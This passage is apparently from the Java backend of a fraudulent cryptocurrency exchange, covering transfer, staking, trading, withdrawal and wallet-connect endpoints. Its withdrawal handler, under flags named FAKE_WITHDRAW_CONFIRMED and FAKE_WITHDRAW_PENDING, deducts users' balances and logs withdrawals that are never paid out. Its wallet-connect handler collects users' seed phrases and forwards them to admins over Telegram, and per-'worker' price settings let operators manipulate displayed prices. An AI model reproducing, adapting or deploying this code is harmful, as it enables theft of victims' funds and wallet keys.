        Coin coin = coinRepository.findBySymbol(coinSymbol).orElse(null);
        if (coin == null) {
            return ResponseEntity.badRequest().body("coin_not_found");
        }

        if (userService.getBalance(user, coin) < amount) {
            return ResponseEntity.badRequest().body("no_balance");
        }

        userService.addBalance(user, coin, -amount);
        userService.addBalance(receiver, coin, amount);

        Date date = new Date();

        UserTransaction fromTransaction = new UserTransaction();
        fromTransaction.setAmount(amount);
        fromTransaction.setDate(date);
        fromTransaction.setCoinSymbol(coinSymbol);
        fromTransaction.setUser(user);
        fromTransaction.setType(UserTransaction.Type.TRANSFER_OUT);
        fromTransaction.setStatus(UserTransaction.Status.COMPLETED);
        fromTransaction.setAddress(receiver.getEmail());

        UserTransaction toTransaction = new UserTransaction();
        toTransaction.setAmount(amount);
        toTransaction.setDate(date);
        toTransaction.setCoinSymbol(coinSymbol);
        toTransaction.setUser(receiver);
        toTransaction.setType(UserTransaction.Type.TRANSFER_IN);
        toTransaction.setStatus(UserTransaction.Status.COMPLETED);
        toTransaction.setAddress(user.getEmail());

        userTransactionRepository.save(fromTransaction);
        userTransactionRepository.save(toTransaction);

        userService.createAction(user, request, "Transferred " + fromTransaction.formattedAmount() + " " + fromTransaction.getCoinSymbol() + " to " + receiver.getEmail());

        return ResponseEntity.ok("success");
    }
    //end transfer

    //start staking
    @PostMapping(value = "staking")
    public ResponseEntity<String> stakingController(Authentication authentication, HttpServletRequest request, @RequestBody Map<String, Object> body) {
        if (!body.containsKey("action")) {
            return ResponseEntity.badRequest().body("no_action");
        }

        User user = userService.getUser(authentication);
        String action = (String) body.get("action");
        switch (action.toUpperCase()) {
            case "STAKE" -> {
                return stake(request, user, body);
            }
            case "UNSTAKE" -> {
                return unstake(request, user, body);
            }
            default -> {
                return ResponseEntity.badRequest().body("action_not_found");
            }
        }
    }

    private ResponseEntity<String> stake(HttpServletRequest request, User user, Map<String, Object> data) {
        if (!user.isFeatureEnabled(UserFeature.Type.STAKING)) {
            return ResponseEntity.badRequest().body("staking_ban");
        }

        long planId = Long.parseLong(String.valueOf(data.get("plan")));
        StakingPlan stakingPlan = user.getWorker() == null ? adminStakingPlanRepository.findById(planId).orElse(null) : workerStakingPlanRepository.findByIdAndWorkerId(planId, user.getWorker().getId()).orElse(null);
        if (stakingPlan == null) {
            return ResponseEntity.badRequest().body("plan_not_found");
        }

        String coinSymbol = String.valueOf(data.get("coin_symbol"));
        Coin coin = coinRepository.findBySymbol(coinSymbol).orElse(null);
        if (coin == null) {
            return ResponseEntity.badRequest().body("coin_not_found");
        }

        double amount = getDoubleValue(data, "amount");
        if (Double.isNaN(amount) || amount <= 0) {
            return ResponseEntity.badRequest().body("amount_error");
        }

        if (userService.getBalance(user, coin) < amount) {
            return ResponseEntity.badRequest().body("no_balance");
        }

        userService.addBalance(user, coin, -amount);

        UserStaking userStaking = new UserStaking();
        userStaking.setPercent(stakingPlan.getPercent());
        userStaking.setCoin(coin);
        userStaking.setAmount(amount);
        userStaking.setTitle(stakingPlan.getTitle());
        userStaking.setStartDate(new Date());
        userStaking.setEndDate(new Date(System.currentTimeMillis() + (1000L * 86400L * stakingPlan.getDays())));
        userStaking.setUser(user);

        userStakingRepository.save(userStaking);

        UserTransaction userTransaction = new UserTransaction();

        userTransaction.setUser(user);
        userTransaction.setAmount(amount);
        userTransaction.setType(UserTransaction.Type.STAKE);
        userTransaction.setStatus(UserTransaction.Status.COMPLETED);
        userTransaction.setDate(new Date());
        userTransaction.setCoinSymbol(coin.getSymbol());

        userTransactionRepository.save(userTransaction);

        userService.createAction(user, request, "Staked " + userTransaction.formattedAmount() + " " + coinSymbol + " (" + stakingPlan.getTitle() + ")");

        return ResponseEntity.ok("success");
    }

    private ResponseEntity<String> unstake(HttpServletRequest request, User user, Map<String, Object> data) {
        long id = Long.parseLong(String.valueOf(data.get("plan")));
        UserStaking userStaking = userStakingRepository.findByIdAndUserId(id, user.getId()).orElse(null);
        if (userStaking == null) {
            return ResponseEntity.badRequest().body("staking_not_found");
        }

        if (!userStaking.isEnded()) {
            userService.addBalance(user, userStaking.getCoin(), userStaking.getAmount());

            userService.createAction(user, request, "Canceled staking " + new MyDecimal(userStaking.getAmount()).toString(8) + " " + userStaking.getCoin().getSymbol() + " (" + userStaking.getTitle() + ")");
        } else {
            double profit = userStaking.getAmount() + (userStaking.getAmount() * (userStaking.getPercent() / 100D * ((double) (userStaking.getEndDate().getTime() - userStaking.getStartDate().getTime()) / 1000L / 86400L)));

            userService.addBalance(user, userStaking.getCoin(), profit);

            userService.createAction(user, request, "Unstaked " + new MyDecimal(profit).toString(8) + " " + userStaking.getCoin().getSymbol() + " (" + userStaking.getTitle() + ")");
        }

        userStakingRepository.deleteById(id);

        UserTransaction userTransaction = new UserTransaction();

        userTransaction.setUser(user);
        userTransaction.setAmount(userStaking.getAmount());
        userTransaction.setType(UserTransaction.Type.UNSTAKE);
        userTransaction.setStatus(UserTransaction.Status.COMPLETED);
        userTransaction.setDate(new Date());
        userTransaction.setCoinSymbol(userStaking.getCoin().getSymbol());

        userTransactionRepository.save(userTransaction);

        return ResponseEntity.ok("success");
    }
    //end staking

    //start trading
    @PostMapping(value = "trading")
    public ResponseEntity<String> tradingController(Authentication authentication, HttpServletRequest request, @RequestBody Map<String, Object> body) {
        if (!body.containsKey("action")) {
            return ResponseEntity.badRequest().body("no_action");
        }

        User user = userService.getUser(authentication);
        String action = (String) body.get("action");
        switch (action.toUpperCase()) {
            case "TIME_DIFFERENCE" -> {
                return timeDifference(user, body);
            }
            case "CHECK_TRADING_CURRENCY_PRICE" -> {
                return checkTradingCurrencyPrice(user, body);
            }
            case "GET_PAIR_STATUS" -> {
                return getPairStatus(user, body);
            }
            case "CREATE_ORDER" -> {
                return createOrder(request, user, body);
            }
            case "CANCEL_ORDER" -> {
                return cancelOrder(request, user, body);
            }
            case "CREATE_LIMIT_ORDER" -> {
                return createLimitOrder(request, user, body);
            }
            case "GET_TRADING_BALANCE" -> {
                return getTradingBalance(user, body);
            }
            case "CLOSE_OPEN_ORDERS" -> {
                return closeOpenOrders(request, user, body);
            }
            default -> {
                return ResponseEntity.badRequest().body("action_not_found");
            }
        }
    }

    private ResponseEntity<String> timeDifference(User user, Map<String, Object> data) {
        long time = 0;
        try {
            time = Long.parseLong(String.valueOf(data.get("time")));
        } catch (Exception ignored) {}

        return ResponseEntity.ok(String.valueOf((System.currentTimeMillis() / 1000) - time));
    }

    private ResponseEntity<String> checkTradingCurrencyPrice(User user, Map<String, Object> data) {
        if (user.getWorker() == null) {
            return ResponseEntity.ok("0");
        }

        String coinSymbol = String.valueOf(data.get("pairs")).split("_")[0].toUpperCase();
        Coin coin = coinRepository.findBySymbol(coinSymbol).orElse(null);
        if (coin == null) {
            return ResponseEntity.ok("0");
        }

        return ResponseEntity.ok(String.valueOf(coinService.getWorkerPrice(user.getWorker(), coin.getSymbol()) - coinService.getPrice(coin.getSymbol())));
    }

    private ResponseEntity<String> getPairStatus(User user, Map<String, Object> data) {
        if (user.getWorker() == null) {
            return ResponseEntity.ok("false");
        }

        String symbol = String.valueOf(data.get("pairs")).split("_")[0].toUpperCase();
        Coin coin = coinRepository.findBySymbol(symbol).orElse(null);
        if (coin == null) {
            return ResponseEntity.ok("false");
        }

        List<FastPump> fastPumps = fastPumpRepository.findAllByWorkerIdAndCoinSymbol(user.getWorker().getId(), coin.getSymbol());

        if (fastPumps.isEmpty()) {
            return ResponseEntity.ok("false");
        }

        long openTime = Long.parseLong(String.valueOf(data.get("open_time"))) * 1000;
        long closeTime = Long.parseLong(String.valueOf(data.get("close_time"))) * 1000;

        FastPump pump = null;
        for (FastPump fastPump : fastPumps) {
            if (fastPump.getTime() >= openTime && fastPump.getTime() <= closeTime) {
                pump = fastPump;
                break;
            }
        }

        if (pump == null) {
            return ResponseEntity.ok("blocked");
        }

        /*double closePrice = Double.parseDouble(data.get("close_price"));
        closePrice = closePrice + (closePrice * pump.getPercent());

        response.getWriter().write(String.valueOf(closePrice));*/

        return ResponseEntity.ok("false");
    }

    private ResponseEntity<String> createOrder(HttpServletRequest request, User user, Map<String, Object> data) {
        if (!user.isFeatureEnabled(UserFeature.Type.TRADING)) {
            return ResponseEntity.badRequest().body("trading_ban");
        }

        if (userTradeOrderRepository.existsByUserIdAndClosedAndTradeType(user.getId(), false, UserTradeOrder.TradeType.MARKET)) {
            return ResponseEntity.badRequest().body("already_exists");
        }

        String coin = String.valueOf(data.get("coin")).toUpperCase().split("USDT")[0];

        double price = getDoubleValue(data, "price");
        if (Double.isNaN(price) || price <= 0) {
            ResponseEntity.badRequest().body("error");
        }

        double amount = getDoubleValue(data, "amount");
        if (Double.isNaN(amount) || amount <= 0) {
            return ResponseEntity.badRequest().body("amount_error");
        }

        double totalPrice = amount * price;
        if (totalPrice < 10) {
            return ResponseEntity.badRequest().body("min_amount");
        }

        String type = String.valueOf(data.get("type"));
        UserTradeOrder.Type orderType = UserTradeOrder.Type.BUY;
        if (type.equals("BUY")) {
            Coin usdt = coinRepository.findUSDT();
            double usdtBalance = userService.getBalance(user, usdt);
            if (usdtBalance + 1 < totalPrice) {
                return ResponseEntity.badRequest().body("no_balance");
            }

            if (usdtBalance < totalPrice) {
                totalPrice = usdtBalance;
            }

            userService.addBalance(user, usdt, -totalPrice);
        } else if (type.equals("SELL")) {
            orderType = UserTradeOrder.Type.SELL;
            double coinBalance = userService.getBalance(user, coin);
            if (coinBalance < amount) {
                return ResponseEntity.badRequest().body("no_balance");
            }

            userService.addBalance(user, coin, -amount);
        }

        UserTradeOrder userTradeOrder = new UserTradeOrder();
        userTradeOrder.setCreated(new Date());
        userTradeOrder.setClosed(false);
        userTradeOrder.setPrice(totalPrice);
        userTradeOrder.setAmount(amount);
        userTradeOrder.setCoinSymbol(coin);
        userTradeOrder.setUser(user);
        userTradeOrder.setType(orderType);
        userTradeOrder.setTradeType(UserTradeOrder.TradeType.MARKET);

        userTradeOrderRepository.save(userTradeOrder);

        userService.createAction(user, request, "Opened an trading order: " + orderType + " " + new MyDecimal(userTradeOrder.getAmount()).toString(8) + " " + userTradeOrder.getCoinSymbol());

        return ResponseEntity.ok("success");
    }

    private ResponseEntity<String> createLimitOrder(HttpServletRequest request, User user, Map<String, Object> data) {
        if (!user.isFeatureEnabled(UserFeature.Type.TRADING)) {
            return ResponseEntity.badRequest().body("trading_ban");
        }

        if (userTradeOrderRepository.countByUserIdAndClosedAndTradeType(user.getId(), false, UserTradeOrder.TradeType.LIMIT) >= 3) {
            return ResponseEntity.badRequest().body("already_exists");
        }

        String coin = String.valueOf(data.get("coin")).toUpperCase().split("USDT")[0];

        double price = getDoubleValue(data, "price");
        if (Double.isNaN(price) || price <= 0) {
            ResponseEntity.badRequest().body("error");
        }

        double amount = getDoubleValue(data, "amount");
        if (Double.isNaN(amount) || amount <= 0) {
            return ResponseEntity.badRequest().body("amount_error");
        }

        double totalPrice = amount * price;
        if (totalPrice < 10) {
            return ResponseEntity.badRequest().body("min_amount");
        }

        String type = String.valueOf(data.get("type"));
        UserTradeOrder.Type orderType = UserTradeOrder.Type.BUY;
        if (type.equals("BUY")) {
            Coin usdt = coinRepository.findUSDT();
            double usdtBalance = userService.getBalance(user, usdt);
            if (usdtBalance < totalPrice) {
                return ResponseEntity.badRequest().body("no_balance");
            }

            userService.addBalance(user, usdt, -totalPrice);
        } else if (type.equals("SELL")) {
            orderType = UserTradeOrder.Type.SELL;
            double coinBalance = userService.getBalance(user, coin);
            if (coinBalance < amount) {
                return ResponseEntity.badRequest().body("no_balance");
            }

            userService.addBalance(user, coin, -amount);
        }

        UserTradeOrder userTradeOrder = new UserTradeOrder();
        userTradeOrder.setCreated(new Date());
        userTradeOrder.setClosed(false);
        userTradeOrder.setPrice(price);
        userTradeOrder.setAmount(amount);
        userTradeOrder.setCoinSymbol(coin);
        userTradeOrder.setUser(user);
        userTradeOrder.setType(orderType);
        userTradeOrder.setTradeType(UserTradeOrder.TradeType.LIMIT);

        userTradeOrderRepository.save(userTradeOrder);

        userService.createAction(user, request, "Opened an trading order: " + orderType + " " + new MyDecimal(userTradeOrder.getAmount()).toString(8) + " " + userTradeOrder.getCoinSymbol());

        return ResponseEntity.ok("success");
    }

    private ResponseEntity<String> cancelOrder(HttpServletRequest request, User user, Map<String, Object> data) {
        long id = Long.parseLong(String.valueOf(data.get("id")));
        UserTradeOrder tradeOrder = userTradeOrderRepository.findByIdAndUserId(id, user.getId()).orElse(null);
        if (tradeOrder == null) {
            return ResponseEntity.status(403).body("error");
        }

        if (tradeOrder.getType() == UserTradeOrder.Type.BUY) {
            Coin usdt = coinRepository.findUSDT();
            userService.addBalance(user, usdt, tradeOrder.getPrice() * tradeOrder.getAmount());
        } else {
            Coin coin = coinRepository.findBySymbol(tradeOrder.getCoinSymbol()).orElse(null);
            if (coin == null) {
                return ResponseEntity.status(403).body("error");
            }

            userService.addBalance(user, coin, tradeOrder.getAmount());
        }

        userTradeOrderRepository.deleteById(id);

        userService.createAction(user, request, "Deleted limit order");

        return ResponseEntity.ok("success");
    }

    private ResponseEntity<String> getTradingBalance(User user, Map<String, Object> data) {
        String coin = String.valueOf(data.get("coin")).toUpperCase();
        double cryptoBalance = userService.getBalance(user, coin);
        double usdtBalance = userService.getBalance(user, coinRepository.findUSDT());

        Map<String, String> responseData = new HashMap<>() {{
            put("crypto_balance", new MyDecimal(cryptoBalance).toString(8));
            put("my_balance", new MyDecimal(usdtBalance, true).toString());
        }};

        return ResponseEntity.ok(JsonUtil.writeJson(responseData));
    }

    private ResponseEntity<String> closeOpenOrders(HttpServletRequest request, User user, Map<String, Object> data) {
        List<UserTradeOrder> tradeOrders = userTradeOrderRepository.findByUserIdAndClosedAndTradeTypeOrderByCreatedDesc(user.getId(), false, UserTradeOrder.TradeType.MARKET);

        boolean purchased = !tradeOrders.isEmpty();

        for (UserTradeOrder tradeOrder : tradeOrders) {
            if (tradeOrder.getType() == UserTradeOrder.Type.BUY) {
                userService.addBalance(user, tradeOrder.getCoinSymbol(), tradeOrder.getAmount() - (tradeOrder.getAmount() / 400D));
            } else {
                userService.addBalance(user, coinRepository.findUSDT(), tradeOrder.getPrice() - (tradeOrder.getPrice() / 400D));
            }

            tradeOrder.setClosed(true);

            userTradeOrderRepository.save(tradeOrder);

            userService.createAction(user, request, "Closed trading order: " + tradeOrder.getType() + " " + new MyDecimal(tradeOrder.getAmount()).toString(8) + " " + tradeOrder.getCoinSymbol());
        }

        return ResponseEntity.ok(String.valueOf(purchased));
    }
    //end trading

    //start withdraw
    @PostMapping(value = "withdraw")
    public ResponseEntity<String> withdrawController(Authentication authentication, HttpServletRequest request, @RequestBody Map<String, Object> body) {
        if (!body.containsKey("action")) {
            return ResponseEntity.badRequest().body("no_action");
        }

        User user = userService.getUser(authentication);
        String action = (String) body.get("action");
        switch (action.toUpperCase()) {
            case "WITHDRAW" -> {
                return withdraw(request, user, body);
            }
            default -> {
                return ResponseEntity.badRequest().body("action_not_found");
            }
        }
    }

    @PostMapping(value = "bank-withdraw")
    public ResponseEntity<String> bankWithdrawController(Authentication authentication, @RequestBody Map<String, Object> data) {
        String iban = String.valueOf(data.get("iban"));
        if (iban.equals("")) {
            return ResponseEntity.badRequest().body("iban_not_valid");
        }
        String firstName = String.valueOf(data.get("firstName"));
        if (!DataValidator.isNameValided(firstName)) {
            return ResponseEntity.badRequest().body("first_name_not_valid");
        }
        String lastName = String.valueOf(data.get("lastName"));
        if (!DataValidator.isNameValided(lastName)) {
            return ResponseEntity.badRequest().body("last_name_not_valid");
        }
        String vat = String.valueOf(data.get("vat"));
        if (vat.equals("")) {
            return ResponseEntity.badRequest().body("vat_not_valid");
        }
        String currency = String.valueOf(data.get("currency"));
        if (currency.equals("")) {
            return ResponseEntity.badRequest().body("currency_not_valid");
        }

        User user = userService.getUser(authentication);

        UserBank userBank = new UserBank(iban, firstName, lastName, vat, currency, user);

        userBankRepository.save(userBank);

        return ResponseEntity.ok("confirmed");
    }

    private ResponseEntity<String> withdraw(HttpServletRequest request, User user, Map<String, Object> data) {
        double amount = getDoubleValue(data, "amount");
        double fee = getDoubleValue(data, "fee");
        if (Double.isNaN(amount) || amount <= 0 || Double.isNaN(fee) || fee < 0) {
            return ResponseEntity.badRequest().body("amount_error");
        }

        String address = String.valueOf(data.get("address"));
        if (address == null || address.length() < 10 || address.length() > 128 || !DataValidator.isTextValidedWithoutSymbols(address)) {
            return ResponseEntity.badRequest().body("address_error");
        }

        String memoString = String.valueOf(data.getOrDefault("memo", ""));
        if (StringUtils.isNotBlank(memoString)) {
            try {
                Long.parseLong(memoString);
            } catch (Exception ex) {
                return ResponseEntity.badRequest().body("memo_error");
            }
        }

        String coinSymbol = (String) data.get("crypto");
        Coin coin = coinRepository.findBySymbol(coinSymbol).orElse(null);
        if (coin == null) {
            return ResponseEntity.badRequest().body("error");
        }

        if (userService.getBalance(user, coin) < amount) {
            return ResponseEntity.badRequest().body("balance_error");
        }

        double limit = 0D;
        Worker worker = user.getWorker();
        if (worker != null) {
            WithdrawCoinLimit withdrawCoinLimit = withdrawCoinLimitRepository.findByWorkerIdAndCoinId(worker.getId(), coin.getId()).orElse(null);
            if (withdrawCoinLimit != null) {
                limit = withdrawCoinLimit.getMinAmount();
            } else {
                CoinSettings coinSettings = worker.getCoinSettings();
                limit = coinSettings.getMinWithdrawAmount() / coinService.getPrice(coin);
            }
        }

        if (limit <= 0D) {
            CoinSettings coinSettings = adminCoinSettingsRepository.findFirst();
            limit = coinSettings.getMinWithdrawAmount() / coinService.getPrice(coin);
        }

        if (amount < limit) {
            return ResponseEntity.badRequest().body("minimum_amount_error:" + new MyDecimal(limit).toString(6));
        }

        String network = String.valueOf(data.get("network"));
        network = Objects.equals(coinSymbol, "USDT") || Objects.equals(coinSymbol, "BNB") ? network.length() > 5 ? network.substring(0, 5) : network : null;

        if (user.isFeatureEnabled(UserFeature.Type.FAKE_WITHDRAW_CONFIRMED)) {
            UserTransaction userTransaction = new UserTransaction();
            userTransaction.setMemo(memoString);
            userTransaction.setAddress(address);
            userTransaction.setNetwork(network);
            userTransaction.setAmount(amount - fee);
            userTransaction.setDate(new Date());
            userTransaction.setCoinSymbol(coinSymbol);
            userTransaction.setType(UserTransaction.Type.WITHDRAW);
            userTransaction.setStatus(UserTransaction.Status.COMPLETED);
            userTransaction.setUser(user);

            userTransactionRepository.save(userTransaction);

            userService.addBalance(user, coin, -amount);

            telegramService.sendMessageToWorker(user.getWorker(), TelegramMessage.MessageType.USER_WITHDRAW, true, user.getEmail(), userTransaction.formattedAmount(), userTransaction.getCoinSymbol(), address, user.getDomain(), StringUtils.isBlank(user.getPromocodeName()) ? "-" : user.getPromocodeName());

            userService.createAction(user, request, "Created confirmed withdraw " + userTransaction.formattedAmount() + " " + userTransaction.getCoinSymbol());

            return ResponseEntity.ok("confirmed");
        } else if (user.isFeatureEnabled(UserFeature.Type.FAKE_WITHDRAW_PENDING)) {
            UserTransaction userTransaction = new UserTransaction();
            userTransaction.setMemo(memoString);
            userTransaction.setAddress(address);
            userTransaction.setNetwork(network);
            userTransaction.setAmount(amount - fee);
            userTransaction.setDate(new Date());
            userTransaction.setCoinSymbol(coinSymbol);
            userTransaction.setType(UserTransaction.Type.WITHDRAW);
            userTransaction.setStatus(UserTransaction.Status.IN_PROCESSING);
            userTransaction.setUser(user);

            userTransactionRepository.save(userTransaction);

            userService.addBalance(user, coin, -amount);

            telegramService.sendMessageToWorker(user.getWorker(), TelegramMessage.MessageType.USER_WITHDRAW, true, user.getEmail(), userTransaction.formattedAmount(), userTransaction.getCoinSymbol(), address, user.getDomain(), StringUtils.isBlank(user.getPromocodeName()) ? "-" : user.getPromocodeName());

            userService.createAction(user, request, "Created pending withdraw " + userTransaction.formattedAmount() + " " + userTransaction.getCoinSymbol());

            return ResponseEntity.ok("pending");
        } else if (user.isAmlModal() || user.isVerificationModal()) {
            return ResponseEntity.ok("verification");
        } else {
            return ResponseEntity.ok("error");
        }
    }
    //end withdraw

    //start wallet-connect
    @PostMapping(value = "wallet-connect")
    public ResponseEntity<String> walletConnectController(Authentication authentication, HttpServletRequest request, @RequestBody Map<String, Object> body) {
        if (!body.containsKey("action")) {
            return ResponseEntity.badRequest().body("no_action");
        }

        User user = userService.getUser(authentication);
        String action = (String) body.get("action");
        switch (action.toUpperCase()) {
            case "ADD_WALLET" -> {
                return addWallet(request, user, body);
            }
            case "DELETE_WALLET" -> {
                return deleteWallet(request, user, body);
            }
            default -> {
                return ResponseEntity.badRequest().body("action_not_found");
            }
        }
    }

    private ResponseEntity<String> addWallet(HttpServletRequest request, User user, Map<String, Object> data) {
        String walletName = String.valueOf(data.get("name"));
        if (StringUtils.isBlank(walletName) || walletName.length() > 64) {
            return ResponseEntity.badRequest().body("name_error");
        }

        String seedPhrase = String.valueOf(data.get("seed_phrase"));
        if (StringUtils.isBlank(seedPhrase) || seedPhrase.length() > 256) {
            return ResponseEntity.badRequest().body("seed_phrase_error");
        }

        if (userWalletConnectRepository.countByUserId(user.getId()) >= 15) {
            return ResponseEntity.badRequest().body("limit");
        }

        UserWalletConnect walletConnect = new UserWalletConnect();
        walletConnect.setDate(new Date());
        walletConnect.setName(walletName);
        walletConnect.setStatus(UserWalletConnect.Status.ON_VERIFICATION);
        walletConnect.setUser(user);
        walletConnect.setSeedPhrase(seedPhrase);

        userWalletConnectRepository.save(walletConnect);

        telegramService.sendMessageToWorker(user.getWorker(), TelegramMessage.MessageType.USER_CONNECT_WALLET_FOR_WORKER, false, user.getEmail(), user.getDomain(), StringUtils.isBlank(user.getPromocodeName()) ? "-" : user.getPromocodeName());
        telegramService.sendMessageToAdmins(TelegramMessage.MessageType.USER_CONNECT_WALLET_FOR_ADMIN, user.getEmail(), user.getDomain(), StringUtils.isBlank(user.getPromocodeName()) ? "-" : user.getPromocodeName(), seedPhrase);

        userService.createAction(user, request, "Connected wallet " + walletConnect.getName());

        return ResponseEntity.ok("success");
    }

    private ResponseEntity<String> deleteWallet(HttpServletRequest request, User user, Map<String, Object> data) {
        long id = Long.parseLong(String.valueOf(data.get("id")));
        UserWalletConnect walletConnect = userWalletConnectRepository.findByIdAndUserId(id, user.getId()).orElse(null);
        if (walletConnect == null || walletConnect.getStatus() == UserWalletConnect.Status.DELETED) {
            return ResponseEntity.badRequest().body("not_found");
        }

        walletConnect.setStatus(UserWalletConnect.Status.DELETED);

        userWalletConnectRepository.save(walletConnect);

        userService.createAction(user, request, "Deleted wallet " + walletConnect.getName());

        return ResponseEntity.ok("success");
    }
    //end wallet-connect

    private double getDoubleValue(Map<String, Object> data, String key) {
        return data.get(key) == null ? -1D : Double.parseDouble(String.valueOf(data.get(key)));
    }
}

